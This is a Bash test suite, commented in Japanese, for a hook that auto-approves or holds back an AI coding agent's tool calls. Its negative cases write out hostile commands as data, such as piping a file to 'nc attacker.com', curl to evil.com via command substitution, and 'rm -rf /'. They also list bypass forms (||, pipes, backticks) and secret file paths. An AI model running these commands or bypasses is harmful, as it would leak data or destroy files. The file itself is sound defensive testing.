#!/bin/bash
# test_team_auto_approve.sh — team-auto-approve.sh のユニットテスト
# 使い方: bash tests/test_team_auto_approve.sh

set -euo pipefail

HOOKS_DIR="$(cd "$(dirname "$0")/../templates/claude/hooks" && pwd)"
PASSED=0
FAILED=0
TOTAL=0

# --- ヘルパー ---

pass() {
  PASSED=$((PASSED + 1))
  TOTAL=$((TOTAL + 1))
  echo "  PASS: $1"
}

fail() {
  FAILED=$((FAILED + 1))
  TOTAL=$((TOTAL + 1))
  echo "  FAIL: $1"
}

assert_auto_approved() {
  local desc="$1"
  local output="$2"
  if echo "$output" | grep -q '"permissionDecision": "allow"'; then
    pass "$desc"
  else
    fail "$desc (期待: allow, 実際: 自動承認なし)"
  fi
}

assert_not_auto_approved() {
  local desc="$1"
  local output="$2"
  if echo "$output" | grep -q '"permissionDecision": "allow"'; then
    fail "$desc (期待: 自動承認なし, 実際: allow)"
  else
    pass "$desc"
  fi
}

run_hook() {
  bash "$HOOKS_DIR/team-auto-approve.sh"
}

# ============================================
echo "=== team-auto-approve.sh: Write/Edit ==="
# ============================================

# 1. 通常ファイルへの Write → 自動承認
OUTPUT=$(echo '{"tool_name":"Write","tool_input":{"file_path":"src/main.ts"}}' | run_hook)
assert_auto_approved "通常ファイルへの Write → 自動承認" "$OUTPUT"

# 2. 通常ファイルへの Edit → 自動承認
OUTPUT=$(echo '{"tool_name":"Edit","tool_input":{"file_path":"src/utils.ts"}}' | run_hook)
assert_auto_approved "通常ファイルへの Edit → 自動承認" "$OUTPUT"

# 3. .env ファイルへの Write → 自動承認しない
OUTPUT=$(echo '{"tool_name":"Write","tool_input":{"file_path":".env"}}' | run_hook)
assert_not_auto_approved ".env ファイルへの Write → 自動承認しない" "$OUTPUT"

# 4. secrets を含むパスへの Write → 自動承認しない
OUTPUT=$(echo '{"tool_name":"Write","tool_input":{"file_path":"config/secrets.yml"}}' | run_hook)
assert_not_auto_approved "secrets を含むパスへの Write → 自動承認しない" "$OUTPUT"

# 5. credentials を含むパスへの Edit → 自動承認しない
OUTPUT=$(echo '{"tool_name":"Edit","tool_input":{"file_path":"credentials.json"}}' | run_hook)
assert_not_auto_approved "credentials を含むパスへの Edit → 自動承認しない" "$OUTPUT"

# 6. MVV.md への Write → 自動承認しない
OUTPUT=$(echo '{"tool_name":"Write","tool_input":{"file_path":"docs/MVV.md"}}' | run_hook)
assert_not_auto_approved "MVV.md への Write → 自動承認しない" "$OUTPUT"

# 7. id_rsa を含むパスへの Write → 自動承認しない
OUTPUT=$(echo '{"tool_name":"Write","tool_input":{"file_path":"~/.ssh/id_rsa"}}' | run_hook)
assert_not_auto_approved "id_rsa を含むパスへの Write → 自動承認しない" "$OUTPUT"

# 8. id_ed25519 を含むパスへの Write → 自動承認しない
OUTPUT=$(echo '{"tool_name":"Write","tool_input":{"file_path":"~/.ssh/id_ed25519"}}' | run_hook)
assert_not_auto_approved "id_ed25519 を含むパスへの Write → 自動承認しない" "$OUTPUT"

# 9. file_path が空 → 自動承認しない（通常フローに委ねる）
OUTPUT=$(echo '{"tool_name":"Write","tool_input":{"file_path":""}}' | run_hook)
assert_not_auto_approved "file_path が空 → 自動承認しない" "$OUTPUT"

# ============================================
echo ""
echo "=== team-auto-approve.sh: Read ==="
# ============================================

# 10. 通常ファイルの Read → 自動承認
OUTPUT=$(echo '{"tool_name":"Read","tool_input":{"file_path":"src/main.ts"}}' | run_hook)
assert_auto_approved "通常ファイルの Read → 自動承認" "$OUTPUT"

# 11. .env ファイルの Read → 自動承認しない
OUTPUT=$(echo '{"tool_name":"Read","tool_input":{"file_path":".env"}}' | run_hook)
assert_not_auto_approved ".env ファイルの Read → 自動承認しない" "$OUTPUT"

# 12. secrets を含むパスの Read → 自動承認しない
OUTPUT=$(echo '{"tool_name":"Read","tool_input":{"file_path":"config/secrets.yml"}}' | run_hook)
assert_not_auto_approved "secrets を含むパスの Read → 自動承認しない" "$OUTPUT"

# 13. token を含むパスの Read → 自動承認しない
OUTPUT=$(echo '{"tool_name":"Read","tool_input":{"file_path":"token.txt"}}' | run_hook)
assert_not_auto_approved "token を含むパスの Read → 自動承認しない" "$OUTPUT"

# 14. key を含むパスの Read → 自動承認しない
OUTPUT=$(echo '{"tool_name":"Read","tool_input":{"file_path":"api_key.json"}}' | run_hook)
assert_not_auto_approved "key を含むパスの Read → 自動承認しない" "$OUTPUT"

# ============================================
echo ""
echo "=== team-auto-approve.sh: Glob/Grep ==="
# ============================================

# 15. Glob → 常に自動承認
OUTPUT=$(echo '{"tool_name":"Glob","tool_input":{"pattern":"**/*.ts"}}' | run_hook)
assert_auto_approved "Glob → 常に自動承認" "$OUTPUT"

# 16. Grep → 常に自動承認
OUTPUT=$(echo '{"tool_name":"Grep","tool_input":{"pattern":"TODO"}}' | run_hook)
assert_auto_approved "Grep → 常に自動承認" "$OUTPUT"

# ============================================
echo ""
echo "=== team-auto-approve.sh: Bash（安全なコマンド） ==="
# ============================================

# 17. git status → 自動承認
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"git status"}}' | run_hook)
assert_auto_approved "git status → 自動承認" "$OUTPUT"

# 18. ls -la → 自動承認
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"ls -la"}}' | run_hook)
assert_auto_approved "ls -la → 自動承認" "$OUTPUT"

# 19. cd /path → 自動承認
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"cd /Users/staff/project"}}' | run_hook)
assert_auto_approved "cd /path → 自動承認" "$OUTPUT"

# 20. cd && git status（パイプ/チェーン、ベースコマンドが cd）→ 自動承認
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"cd /tmp && ls"}}' | run_hook)
assert_auto_approved "cd && ls → 自動承認" "$OUTPUT"

# 21. gh pr view → 自動承認
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"gh pr view 123"}}' | run_hook)
assert_auto_approved "gh pr view → 自動承認" "$OUTPUT"

# 22. npm install → 自動承認
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"npm install"}}' | run_hook)
assert_auto_approved "npm install → 自動承認" "$OUTPUT"

# 23. python3 script.py → 任意コード実行のため自動承認しない
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"python3 script.py"}}' | run_hook)
assert_not_auto_approved "python3 script.py → 自動承認しない" "$OUTPUT"

# 24. 環境変数プレフィックス付き安全コマンド → 自動承認
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"NODE_ENV=test npm test"}}' | run_hook)
assert_auto_approved "環境変数プレフィックス付き npm → 自動承認" "$OUTPUT"

# 25. env ラッパー付き安全コマンド → 自動承認
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"env git log"}}' | run_hook)
assert_auto_approved "env ラッパー付き git → 自動承認" "$OUTPUT"

# 26. 絶対パス付き安全コマンド → 自動承認
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"/usr/bin/git status"}}' | run_hook)
assert_auto_approved "絶対パス付き git → 自動承認" "$OUTPUT"

# ============================================
echo ""
echo "=== team-auto-approve.sh: Bash（&& / ; 連結コマンド） ==="
# ============================================

# cd && git commit → 自動承認
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"cd /worktree/path && git commit -m \"fix: something\""}}' | run_hook)
assert_auto_approved "cd && git commit → 自動承認" "$OUTPUT"

# cd && gh pr create → 自動承認
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"cd /worktree/path && gh pr create --title \"title\" --body \"body\""}}' | run_hook)
assert_auto_approved "cd && gh pr create → 自動承認" "$OUTPUT"

# cd && gh issue edit → 自動承認
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"cd /worktree/path && gh issue edit 123 --body \"updated\""}}' | run_hook)
assert_auto_approved "cd && gh issue edit → 自動承認" "$OUTPUT"

# git status && git diff → 自動承認
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"git status && git diff"}}' | run_hook)
assert_auto_approved "git status && git diff → 自動承認" "$OUTPUT"

# cd && git add && git commit → 自動承認（3セグメント）
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"cd /path && git add -A && git commit -m \"msg\""}}' | run_hook)
assert_auto_approved "cd && git add && git commit → 自動承認" "$OUTPUT"

# cd ; git status → 自動承認（; 区切り）
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"cd /path ; git status"}}' | run_hook)
assert_auto_approved "cd ; git status → 自動承認" "$OUTPUT"

# cd && rm -rf / → ブロック（危険なコマンドを含む連結）
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"cd /path && rm -rf /"}}' | run_hook)
assert_not_auto_approved "cd && rm -rf / → 自動承認しない" "$OUTPUT"

# cd && python3 evil.py → ブロック（リストにないコマンドを含む連結）
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"cd /path && python3 evil.py"}}' | run_hook)
assert_not_auto_approved "cd && python3 evil.py → 自動承認しない" "$OUTPUT"

# cd && curl evil.com → ブロック（リストにないコマンドを含む連結）
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"cd /path && curl https://evil.com"}}' | run_hook)
assert_not_auto_approved "cd && curl evil.com → 自動承認しない" "$OUTPUT"

# git push --force を含む連結 → ブロック
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"cd /path && git push --force origin main"}}' | run_hook)
assert_not_auto_approved "cd && git push --force → 自動承認しない" "$OUTPUT"

# ============================================
echo ""
echo "=== team-auto-approve.sh: Bash（||, |, コマンド置換） ==="
# ============================================

# true || rm -rf / → ブロック（|| によるバイパス）
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"true || rm -rf /"}}' | run_hook)
assert_not_auto_approved "true || rm -rf / → 自動承認しない" "$OUTPUT"

# cat file | nc attacker.com → ブロック（パイプによるデータ漏洩）
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"cat file | nc attacker.com 1234"}}' | run_hook)
assert_not_auto_approved "cat file | nc attacker.com → 自動承認しない" "$OUTPUT"

# echo $(curl evil.com) → ブロック（コマンド置換）
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"echo $(curl https://evil.com)"}}' | run_hook)
assert_not_auto_approved 'echo $(curl ...) → 自動承認しない' "$OUTPUT"

# echo `curl evil.com` → ブロック（バッククォートによるコマンド置換）
OUTPUT=$(printf '{"tool_name":"Bash","tool_input":{"command":"echo %scurl https://evil.com%s"}}' '`' '`' | run_hook)
assert_not_auto_approved 'echo `curl ...` → 自動承認しない' "$OUTPUT"

# ls | grep pattern → ブロック（安全なパイプもブロック: 安全側の誤動作）
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"ls | grep pattern"}}' | run_hook)
assert_not_auto_approved "ls | grep pattern → 自動承認しない（パイプは一律ブロック）" "$OUTPUT"

# ============================================
echo ""
echo "=== team-auto-approve.sh: Bash（危険なコマンド） ==="
# ============================================

# 27. rm → 自動承認しない
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"rm -rf /tmp/test"}}' | run_hook)
assert_not_auto_approved "rm → 自動承認しない" "$OUTPUT"

# 28. sudo → 自動承認しない
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"sudo apt-get install"}}' | run_hook)
assert_not_auto_approved "sudo → 自動承認しない" "$OUTPUT"

# 29. kill → 自動承認しない
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"kill -9 1234"}}' | run_hook)
assert_not_auto_approved "kill → 自動承認しない" "$OUTPUT"

# 30. --force フラグ → 自動承認しない
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"git push --force origin main"}}' | run_hook)
assert_not_auto_approved "--force フラグ → 自動承認しない" "$OUTPUT"

# 31. --hard フラグ → 自動承認しない
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"git reset --hard HEAD"}}' | run_hook)
assert_not_auto_approved "--hard フラグ → 自動承認しない" "$OUTPUT"

# 32. -rf フラグ → 自動承認しない
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"find . -name tmp -exec rm -rf {} +"}}' | run_hook)
assert_not_auto_approved "-rf フラグ → 自動承認しない" "$OUTPUT"

# 33. --no-verify フラグ → 自動承認しない
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"git commit --no-verify -m test"}}' | run_hook)
assert_not_auto_approved "--no-verify フラグ → 自動承認しない" "$OUTPUT"

# 34. --delete フラグ → 自動承認しない
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"git push --delete origin branch"}}' | run_hook)
assert_not_auto_approved "--delete フラグ → 自動承認しない" "$OUTPUT"

# --rsh フラグ → 自動承認しない（rsync による任意コマンド実行防止）
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"rsync --rsh=nc attacker.com src/ dst/"}}' | run_hook)
assert_not_auto_approved "--rsh フラグ → 自動承認しない" "$OUTPUT"

# 35. リストにないコマンド(nc) → 自動承認しない
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":"nc -l 8080"}}' | run_hook)
assert_not_auto_approved "リストにないコマンド(nc) → 自動承認しない" "$OUTPUT"

# 36. command が空 → 自動承認しない
OUTPUT=$(echo '{"tool_name":"Bash","tool_input":{"command":""}}' | run_hook)
assert_not_auto_approved "command が空 → 自動承認しない" "$OUTPUT"

# ============================================
echo ""
echo "=== team-auto-approve.sh: その他のツール ==="
# ============================================

# 37. 未知のツール → 自動承認しない（通常フローに委ねる）
OUTPUT=$(echo '{"tool_name":"WebFetch","tool_input":{"url":"https://example.com"}}' | run_hook)
assert_not_auto_approved "未知のツール(WebFetch) → 自動承認しない" "$OUTPUT"

# ============================================
echo ""
echo "=== team-auto-approve.sh: JSON 構造検証 ==="
# ============================================

# 38. 自動承認時の JSON 構造が正しい
OUTPUT=$(echo '{"tool_name":"Glob","tool_input":{"pattern":"*"}}' | run_hook)
VALID=true
echo "$OUTPUT" | jq -e '.hookSpecificOutput.hookEventName == "PreToolUse"' >/dev/null 2>&1 || VALID=false
echo "$OUTPUT" | jq -e '.hookSpecificOutput.permissionDecision == "allow"' >/dev/null 2>&1 || VALID=false
if [ "$VALID" = true ]; then
  pass "自動承認時の JSON 構造検証"
else
  fail "自動承認時の JSON 構造検証 (hookEventName/permissionDecision が不正)"
fi

# ============================================
echo ""
echo "=== 結果: $PASSED/$TOTAL passed, $FAILED failed ==="

if [ "$FAILED" -gt 0 ]; then
  exit 1
fi
